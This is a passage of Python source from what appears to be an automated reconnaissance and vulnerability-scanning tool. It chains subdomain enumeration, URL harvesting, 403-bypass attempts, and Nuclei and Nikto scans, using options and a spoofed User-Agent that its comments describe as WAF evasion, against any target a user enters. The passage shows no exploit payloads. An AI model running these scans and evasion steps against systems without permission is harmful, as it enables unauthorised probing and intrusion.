    ▓█████  ███▄    █   ▄████  ██▓ ███▄    █  ██████ 
    ▓█   ▀  ██ ▀█   █   ██▒ ▀█▒▓██▒ ██ ▀█   █ ▒██    ▒ 
    ▒███    ▓██  ▀█ ██▒▒██░▄▄▄░▒██▒▓██  ▀█ ██▒░ ▓██▄   
    ▒▓█  ▄  ▓██▒  ▐▌██▒░▓█  ██▓░██░▓██▒  ▐▌██▒  ▒   ██▒
    ░▒████▒▒██░   ▓██░░▒▓███▀▒░██░▒██░   ▓██░▒██████▒▒
    ░░ ▒░ ░░ ▒░   ▒ ▒  ░▒   ▒ ░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░░ ░░   ░ ▒░  ░   ░  ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░
       ░     ░    ░ ░ ░ ░   ░  ▒ ░   ░   ░ ░ ░  ░  ░  
       ░  ░         ░       ░  ░           ░       ░  
                                                      
    [!] SYSTEM ALERT: ADVANCED OFFENSIVE TOOLCHAIN ACTIVATED
    """)
    
    print(Fore.YELLOW + Style.BRIGHT + "    [+] TARGET LOCKED   : " + Fore.WHITE + f"{target}")
    print(Fore.YELLOW + Style.BRIGHT + "    [+] MODE            : " + Fore.RED + "DEEP INFILTRATION (WAF/403 BYPASS ENABLED)")
    print(Fore.YELLOW + Style.BRIGHT + "    [+] TOOLS ENGAGED   : " + Fore.CYAN + "Subfinder, Nuclei, Nikto, DNSx, GAU, 403-Bypass")
    print(Fore.RED + Style.BRIGHT + "    [!] WARNING         : " + "This process generates HIGH network traffic.")
    print(Fore.RED + "="*70 + "\n")
    time.sleep(1) 
    # --- DANGEROUS BANNER END ---

    log_step("Initializing Advanced Binary Toolchain...", 1)

    # 1. Setup Folders
    base_folder = clean_target_input(target) # Assumes existing utility
    advanced_folder = os.path.join(base_folder, "Advanced_Scans")
    if not os.path.exists(advanced_folder):
        os.makedirs(advanced_folder)

    results = {
        "subdomains": [],
        "urls": [],
        "nuclei_findings": [],
        "403_bypasses": [],
        "tools_used": []
    }

    # Helper to check if tool exists
    def _check_tool(name):
        path = shutil.which(name)
        if path: return path
        home = os.path.expanduser("~")
        gopath = os.path.join(home, "go", "bin", name)
        usrlocal = os.path.join("/usr/local/bin", name)
        if os.path.exists(gopath): return gopath
        if os.path.exists(usrlocal): return usrlocal
        return None

    # Helper to run command safely
    def _run_cmd(command_list, output_file=None, timeout=600):
        tool_name = command_list[0]
        try:
            log_step(f"Running {os.path.basename(tool_name)}...", 2)
            process = subprocess.run(
                command_list,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=timeout
            )
            output = process.stdout.strip()
            if output_file and output:
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(output)
            return output
        except subprocess.TimeoutExpired:
            log_step(f"{tool_name} timed out.", "error")
            return ""
        except Exception as e:
            log_step(f"{tool_name} failed: {e}", "error")
            return ""

    # --- STEP 1: SUBDOMAIN ENUMERATION (Subfinder, Assetfinder, Findomain) ---
    all_subs = set()
    
    # Subfinder
    sf_path = _check_tool("subfinder")
    if sf_path:
        out_path = os.path.join(advanced_folder, "subfinder.txt")
        output = _run_cmd([sf_path, "-d", target, "-silent"], out_path)
        if output:
            for line in output.splitlines(): all_subs.add(line.strip())
            results["tools_used"].append("Subfinder")

    # Assetfinder
    af_path = _check_tool("assetfinder")
    if af_path:
        out_path = os.path.join(advanced_folder, "assetfinder.txt")
        output = _run_cmd([af_path, "--subs-only", target], out_path)
        if output:
            for line in output.splitlines(): all_subs.add(line.strip())
            results["tools_used"].append("Assetfinder")

    # Findomain
    fd_path = _check_tool("findomain")
    if fd_path:
        out_path = os.path.join(advanced_folder, "findomain.txt")
        _run_cmd([fd_path, "-t", target, "-q", "-u", out_path])
        if os.path.exists(out_path):
            with open(out_path, 'r') as f:
                for line in f: all_subs.add(line.strip())
            results["tools_used"].append("Findomain")

    # Save aggregated subdomains
    results["subdomains"] = sorted(list(all_subs))
    merged_subs_path = os.path.join(advanced_folder, "all_subdomains.txt")
    with open(merged_subs_path, "w") as f:
        for sub in results["subdomains"]:
            f.write(sub + "\n")
    log_step(f"Total Unique Subdomains Found: {len(results['subdomains'])}", 3)

    # --- STEP 2: DNS VERIFICATION (DNSx) ---
    dnsx_path = _check_tool("dnsx")
    live_subs_path = os.path.join(advanced_folder, "live_subdomains.txt")
    
    if dnsx_path and results["subdomains"]:
        log_step("Verifying active subdomains via DNSx...", 2)
        _run_cmd([dnsx_path, "-l", merged_subs_path, "-silent", "-o", live_subs_path])
        
        count = 0
        if os.path.exists(live_subs_path):
            with open(live_subs_path, 'r') as f:
                count = sum(1 for _ in f)
            log_step(f"Active Subdomains (DNS Resolved): {count}", 3)
            results["tools_used"].append("DNSx")
    else:
        # Fallback logic
        shutil.copy(merged_subs_path, live_subs_path)

    # --- STEP 3: URL DISCOVERY (Waybackurls, GAU) ---
    urls = set()
    wb_path = _check_tool("waybackurls")
    if wb_path:
        out_path = os.path.join(advanced_folder, "waybackurls.txt")
        output = _run_cmd([wb_path, target], out_path)
        if output:
            for line in output.splitlines(): urls.add(line.strip())
            results["tools_used"].append("Waybackurls")

    gau_path = _check_tool("gau")
    if gau_path:
        out_path = os.path.join(advanced_folder, "gau.txt")
        output = _run_cmd([gau_path, target], out_path)
        if output:
            for line in output.splitlines(): urls.add(line.strip())
            results["tools_used"].append("GAU")
            
    results["urls"] = list(urls)[:500] 
    log_step(f"Total URLs Discovered: {len(urls)}", 3)

    # --- STEP 4: 403 BYPASS ATTEMPTS (Native Python) ---
    # We look for interesting URLs (admin, hidden, dashboard) in the found list
    interesting_keywords = ['admin', 'login', 'dashboard', 'config', 'backup', 'portal']
    potential_403s = [u for u in results["urls"] if any(k in u for k in interesting_keywords)]
    
    if potential_403s:
        log_step(f"Attempting 403 Bypass on {len(potential_403s)} interesting URLs...", 2)
        for p_url in potential_403s[:10]: # Limit to 10 to avoid huge delay
            bypasses = attempt_403_bypass(p_url)
            if bypasses:
                print(f"{Fore.GREEN}    [!] 403 BYPASS SUCCESS: {p_url}{Fore.ENDC}")
                for b in bypasses:
                    print(f"{Fore.GREEN}        -> {b}{Fore.ENDC}")
                    results["403_bypasses"].append(f"{p_url} | {b}")

    # --- STEP 5: VULNERABILITY SCANNING (Nuclei with WAF Evasion) ---
    nuclei_path = _check_tool("nuclei")
    if nuclei_path:
        nuclei_out = os.path.join(advanced_folder, "nuclei_results.json")
        
        # Build Command
        cmd = [
            nuclei_path,
            "-severity", "critical,high,medium", 
            "-json-export", nuclei_out,
            "-silent",
            # WAF Evasion Flags
            "-rate-limit", "150",       # Slow down slightly
            "-bulk-size", "25",         # Reduce concurrent requests
            "-header", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" # Fake UA
        ]

        # Use Live Subdomains List if exists, otherwise single target
        if os.path.exists(live_subs_path):
             cmd.extend(["-l", live_subs_path])
             log_step("Running Nuclei on ALL Subdomains...", 2)
        else:
             cmd.extend(["-u", target])
             log_step("Running Nuclei on Main Target...", 2)

        try:
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1800) # 30 mins max
            
            if os.path.exists(nuclei_out):
                findings = []
                with open(nuclei_out, 'r') as f:
                    for line in f:
                        if line.strip():
                            findings.append(json.loads(line))
                results["nuclei_findings"] = findings
                log_step(f"Nuclei Findings: {len(findings)}", 3)
                results["tools_used"].append("Nuclei")
        except Exception as e:
            log_step(f"Nuclei Error: {e}", "error")

    # --- STEP 6: LEGACY SCAN (Nikto - Basic WAF Evasion) ---
    nikto_path = _check_tool("nikto")
    if nikto_path:
        nikto_out = os.path.join(advanced_folder, "nikto.json")
        # Added -evasion 1 (Random URI encoding)
        cmd = [nikto_path, "-h", target, "-o", nikto_out, "-Format", "json", "-Tuning", "123b", "-evasion", "1"] 
        log_step("Running Nikto (Legacy)...", 2)
        try:
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=600)
            if os.path.exists(nikto_out):
                results["tools_used"].append("Nikto")
        except subprocess.TimeoutExpired:
            log_step("Nikto scan timed out.", "error")

    return results

# --- MAIN LOGIC ---
def run_recon_process(raw_input, mode):
    
    print_phase1_banner()

    target = clean_target_input(raw_input)
    
    log_step(f"TARGET ACQUIRED: {target} [{mode.upper()}]", 1)

    # 1. Folder Setup
    base_folder = target
    screenshots_folder = os.path.join(base_folder, "Web Screenshots")
    ai_report_folder = os.path.join(base_folder, "AI Report")

    for f in [base_folder, screenshots_folder, ai_report_folder]:
        if not os.path.exists(f):
            os.makedirs(f)

    # 2. Data Collection
    full_data = {
        "target": target,
        "date": str(datetime.now()),
        "resolved_ip": None,
        "ip_info": {},
        "http_analysis": {}, # New
        "robots_txt": [],    # New
        "dns": [],
        "viewdns": {},
        "history_scans": [],
        "certs": []
    }

    if mode == "ip":
        full_data["resolved_ip"] = target
        full_data["ip_info"] = module_ip_api(target)
    else:
        ip = get_ip_from_domain(target)
        if ip:
            log_step(f"Resolved IP: {ip}", 2)
            full_data["resolved_ip"] = ip
            full_data["ip_info"] = module_ip_api(ip)
        
        # New Modules Run Here
        full_data["http_analysis"] = module_http_analysis(target)
        full_data["robots_txt"] = module_robots_txt(target)
        
        full_data["dns"] = module_phishs_dns(target)
        full_data["viewdns"] = module_viewdns(target, ip)
        full_data["history_scans"] = module_urlscan(target)
        full_data["certs"] = module_crtsh(target)

    # 3. SCREENSHOTS ENGINE
    log_step("Engaging Screenshot Engine...", 1)

    if full_data["history_scans"]:
        log_step("Downloading Historical Screenshots...", 2)
        for i, item in enumerate(full_data["history_scans"]):
            if i >= 3: break
            url = item.get("screenshot_url")
            if url:
                fname = f"History_Shot_{i+1}.png"
                path = download_image(url, screenshots_folder, fname)
                if path: log_step(f"Saved: {fname}", 3)

    if mode == "domain":
        log_step("Requesting Live Screenshots (Thum.io)...", 2)
        desktop_url = f"https://image.thum.io/get/auth/{THUM_IO_AUTH}/width/1200/crop/800/noanimate/http://{target}"
        d_path = download_image(desktop_url, screenshots_folder, "Live_Desktop.png")
        if d_path: log_step("Saved: Live_Desktop.png", 3)
        
        mobile_url = f"https://image.thum.io/get/auth/{THUM_IO_AUTH}/width/400/crop/800/noanimate/http://{target}"
        m_path = download_image(mobile_url, screenshots_folder, "Live_Mobile.png")
        if m_path: log_step("Saved: Live_Mobile.png", 3)

    # 4. Clean & Save JSON
    clean_data = remove_redundancy(full_data)
    save_to_file(base_folder, "report.json", clean_data)
    log_step("Raw JSON Data Saved.", 2)

    # 5. GENERATE STANDARD PDF
    pdf = StandardPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=10)
    
    def print_dict(d, indent=0):
        for k, v in d.items():
            prefix = " " * indent
            if isinstance(v, dict):
                pdf.set_font("Arial", 'B', 10)
                pdf.cell(0, 6, f"{prefix}{k}:", 0, 1)
                print_dict(v, indent + 4)
            elif isinstance(v, list):
                pdf.set_font("Arial", 'B', 10)
                pdf.cell(0, 6, f"{prefix}{k}:", 0, 1)
                pdf.set_font("Arial", '', 10)
                for item in v[:5]:
                    pdf.cell(0, 6, f"{prefix}  - {str(item)[:80]}...", 0, 1)
            else:
                pdf.set_font("Arial", '', 10)
                clean_v = str(v).encode('latin-1', 'replace').decode('latin-1')
                pdf.cell(0, 6, f"{prefix}{k}: {clean_v}", 0, 1)

    
    pdf.output(os.path.join(base_folder, "report.pdf"))
    log_step("Standard PDF Report Generated.", 2)

    # 6. AI ANALYSIS (GEMINI)
    log_step("Transmitting data to AI Neural Net...", 1)
    ai_verdict = analyze_with_gemini(clean_data)
    
    ai_pdf_path = save_ai_report_pdf(ai_verdict, ai_report_folder)
    log_step(f"AI Report Saved: {ai_pdf_path}", 2)

    # 7. FINAL REPORT
    print("\n" + Colors.CYAN + "="*60)
    print(f"{Colors.BOLD}   AI SECURITY ASSESSMENT VERDICT{Colors.ENDC}")
    print(Colors.CYAN + "="*60 + Colors.ENDC)

    # 8 Web Cheak V2
    full_data["webcheck_v2"] = module_webcheck_v2(target)
   
    # Starting Phase 2
    HUNTING_MODE(target)

    # Starting Phase 3
    cve_2025_scan(target)

    # Starting Phase 4
    full_data["advanced_scan"] = module_advanced_tools(target)
    
    # EXIT MECHANISM FOR SUBPROCESS
    input(f"\n{Colors.WARNING}Press ENTER to return to Sentinel-X Menu...{Colors.ENDC}")
    os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    print_banner()
    print(f"{Colors.WARNING}1. IP Search{Colors.ENDC}")
    print(f"{Colors.WARNING}2. Domain Search{Colors.ENDC}")
    
    choice = input(f"\n{Colors.BOLD}[?] Select Module > {Colors.ENDC}")
    
    if choice == "1":
        t = input(f"{Colors.BOLD}[?] Enter IP > {Colors.ENDC}")
        run_recon_process(t, "ip")
    elif choice == "2":
        t = input(f"{Colors.BOLD}[?] Enter Domain > {Colors.ENDC}")
        run_recon_process(t, "domain")
    else:
        print("Invalid Choice.")